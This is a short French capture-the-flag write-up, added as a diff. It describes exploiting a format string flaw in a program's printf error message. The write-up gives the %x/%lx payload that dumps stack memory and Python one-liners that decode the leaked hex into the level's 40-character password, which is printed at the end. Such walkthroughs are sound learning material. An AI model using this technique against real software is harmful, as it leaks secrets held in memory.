@@ -1,0 +1,37 @@
+on ne peut pas vraiment utiliser gdb car si le programme
+n'arrive pas a ouvrir le fichier il exit.
+on peut quand meme le desassambler et on voit qu'il utilise un printf
+pour afficher le message d'erreur "<login> does not have access!"
+
+on essai donc de mettre des %x dans le chaine et on voit qu'il affiche une adressse
+
+le programe est donc faillible a ce niveau la
+
+en mettant plein de %lx (afficher 16 bits) on voit des adresses au debut puis
+une chaine en hexa qu'il semble possible de convertir en ascii
+
+seul probleme on voit dans le programe que la chaine doit faire 41 octets
+or elle ne semble pas entiere
+
+donc on met des %x au debut car on n'a pas besoin des adresses de debut pour se concentrer sur le reste
+
+=> %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %lx %lx %lx %lx %lx %lx
+
+on reverse les adresse hex (little endian) et on les converti en ascii
+
+-> "756e505234376848".decode("hex")[::-1]
+	=> 'Hh74RPnu'
+
+-> "45414a3561733951".decode("hex")[::-1]
+	=> 'Q9sa5JAE'
+
+-> "377a7143574e6758".decode("hex")[::-1]
+	=> 'XgNWCqz7'
+
+-> "354a35686e475873".decode("hex")[::-1]
+	=> 'sXGnh5J5'
+
+-> "48336750664b394d".decode("hex")[::-1]
+	=> 'M9KfPg3H'
+
+Result => Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
